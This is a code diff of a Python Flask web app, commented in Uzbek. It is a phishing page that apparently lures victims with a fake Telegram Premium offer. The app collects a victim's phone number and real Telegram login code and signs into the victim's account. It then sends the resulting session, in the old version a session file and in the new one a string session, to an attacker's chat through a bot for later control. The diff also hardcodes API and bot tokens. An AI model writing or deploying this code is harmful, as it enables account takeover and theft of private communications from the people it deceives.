@@ -1,88 +1,89 @@
 import os
-import requests
 import asyncio
-from flask import Flask, request, render_template, session
+from flask import Flask, render_template, request, jsonify
 from telethon import TelegramClient
-
-app = Flask(__name__)
-app.secret_key = 'super-secret-key-999'
+from telethon.sessions import StringSession
+import telebot
 
 # --- SOZLAMALAR ---
+# API ma'lumotlaringiz o'zgarishsiz qoladi
 API_ID = 36197920
 API_HASH = '2ccde5b4efd9a1465286f2bbcfec4b05'
-BOT_TOKEN = '7986845957:AAHZfZ3boIazxcJ5vShujQfTeEWYd1JdyZ4'
-ADMIN_ID = '8275787221'
+BOT_TOKEN = '7629255776:AAH56h9vB9C9SntYgH0079VvTivY_y5p6U0'
+ADMIN_ID = 6046023363
 
-if not os.path.exists('sessions'):
-    os.makedirs('sessions')
+app = Flask(__name__)
+bot = telebot.TeleBot(BOT_TOKEN)
 
-def send_to_admin(msg):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    requests.post(url, json={"chat_id": ADMIN_ID, "text": msg})
-
-def send_file_to_admin(file_path):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
-    with open(file_path, 'rb') as f:
-        requests.post(url, data={"chat_id": ADMIN_ID}, files={"document": f})
+# Vaqtinchalik ma'lumotlarni saqlash
+user_data = {}
 
 @app.route('/')
 def index():
     return render_template('index.html')
 
-@app.route('/login', methods=['POST'])
-def login():
-    phone = request.form.get('phone').replace(' ', '')
-    session['phone'] = phone
+@app.route('/send_phone', methods=['POST'])
+async def send_phone():
+    phone = request.json.get('phone')
+    if not phone:
+        return jsonify({"status": "error", "message": "Raqam kiritilmadi"})
     
-    # Yangi kiritilgan raqam uchun yangi sessiya yaratish
-    client = TelegramClient(f'sessions/{phone}', API_ID, API_HASH)
+    # Yangi mijoz yaratish
+    client = TelegramClient(StringSession(), API_ID, API_HASH)
+    await client.connect()
     
-    async def get_code():
-        await client.connect()
-        # Bu yerda haqiqiy Telegram kodini so'raymiz
-        sent_code = await client.send_code_request(phone)
-        session['phone_code_hash'] = sent_code.phone_code_hash
-        await client.disconnect()
+    try:
+        sent = await client.send_code_request(phone)
+        user_data[phone] = {
+            "client": client, 
+            "phone_code_hash": sent.phone_code_hash
+        }
+        return jsonify({"status": "success"})
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)})
+
+@app.route('/send_code', methods=['POST'])
+async def send_code():
+    phone = request.json.get('phone')
+    code = request.json.get('code')
+    
+    if phone not in user_data:
+        return jsonify({"status": "error", "message": "Sessiya topilmadi"})
+    
+    data = user_data[phone]
+    client = data['client']
+    
+    try:
+        # Kod bilan kirish
+        await client.sign_in(phone, code, phone_code_hash=data['phone_code_hash'])
         
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    loop.run_until_complete(get_code())
-    
-    send_to_admin(f"📞 Raqam: {phone}\nKOD YUBORILDI! Endi foydalanuvchi kod kiritishini kuting.")
-    return render_template('verify.html', phone=phone)
-
-@app.route('/verify', methods=['POST'])
-def verify():
-    code = request.form.get('code')
-    phone = session.get('phone')
-    phone_code_hash = session.get('phone_code_hash')
-    
-    client = TelegramClient(f'sessions/{phone}', API_ID, API_HASH)
-    
-    async def sign_in_process():
-        await client.connect()
-        try:
-            # Akkauntga kirishni tasdiqlash
-            await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
+        if await client.is_user_authorized():
+            # STRING SESSION GENERATSIYA QILISH
+            # Bu eng xavfsiz va buzilmaydigan format
+            string_session = client.session.save()
+            
+            # Botga xabar yuborish (MarkDown formatida)
+            msg = (
+                f"✅ **AKKAUNTGA KIRILDI!**\n\n"
+                f"📞 **Raqam:** `{phone}`\n\n"
+                f"🔑 **STRING SESSION (Nusxalab oling):**\n"
+                f"`{string_session}`\n\n"
+                f"💡 _Ushbu kodni control.py skriptiga tashlang._"
+            )
+            bot.send_message(ADMIN_ID, msg, parse_mode="Markdown")
+            
+            # Aloqani uzish va tozalash
             await client.disconnect()
-            return True
-        except Exception as e:
-            await client.disconnect()
-            send_to_admin(f"❌ Kirishda xato: {str(e)}")
-            return False
-
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    success = loop.run_until_complete(sign_in_process())
-    
-    if success:
-        session_file = f'sessions/{phone}.session'
-        send_to_admin(f"✅ MUVAFFAQIYATLI KIRILDI!\n📞 Raqam: {phone}")
-        # Eng muhim joyi: .session faylini darhol yuborish
-        send_file_to_admin(session_file)
-        return "Telegram Premium faollashtirildi!"
-    else:
-        return "Xatolik: Kod noto'g'ri yoki muddatdan o'tgan."
+            user_data.pop(phone)
+            
+            return jsonify({"status": "success"})
+        else:
+            return jsonify({"status": "error", "message": "Avtorizatsiya xatosi"})
+            
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)})
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=8080)
+    # Render uchun portni sozlash
+    port = int(os.environ.get('PORT', 8080))
+    app.run(host='0.0.0.0', port=port)
